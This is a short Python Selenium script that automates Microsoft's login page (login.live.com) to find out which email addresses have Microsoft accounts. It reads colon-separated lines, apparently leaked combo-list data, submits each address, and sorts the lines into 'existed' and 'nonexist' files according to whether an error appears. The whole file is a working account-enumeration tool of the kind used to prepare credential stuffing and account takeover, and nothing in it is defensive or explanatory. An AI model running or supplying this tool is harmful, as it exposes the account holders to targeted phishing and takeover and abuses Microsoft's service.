# coding: utf-8
import sys
import platform
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from time import sleep
import urllib

# Read the content from the file
with open('input.txt', 'r') as f:
    content = f.readlines()
# You may also want to remove whitespace characters like `\n` at the end of each line

service = Service()
service.creation_flags = 0x08000000                                         # ヘッドレスモードで DevTools listening on ws:~~ を表示させない
options = Options()

options.add_argument('--log-level=3')
options.add_argument('--disable-extensions')


# Initialize the WebDriver with the service and options
driver = webdriver.Chrome(service=service,options=options)

sleep(1)
i = 0
for aline in content:
    driver.get("https://login.live.com/")
    sleep(2)
    email = aline.split(':')[2]

    i += 1
    driver.find_element(By.ID, 'i0116').clear()
    sleep(1)
    driver.find_element(By.ID, 'i0116').send_keys(email)
    driver.find_element(By.ID, 'idSIButton9').click()
    sleep(2)
    if len(driver.find_elements(By.ID, 'i0116Error')) == 0:
        with open("existed.txt", "a") as myfile:
            myfile.write(aline)
        print(str(i) + '  ' + email + ' is EXISTED')
        sleep(2)
    else:  # time out:
        # If not find --> Acc does not exist --> OK
        print(str(i) + '    ' + email + ' is Not exist')
        with open("nonexistyahoo.txt", "a") as myfile:
            myfile.write(aline)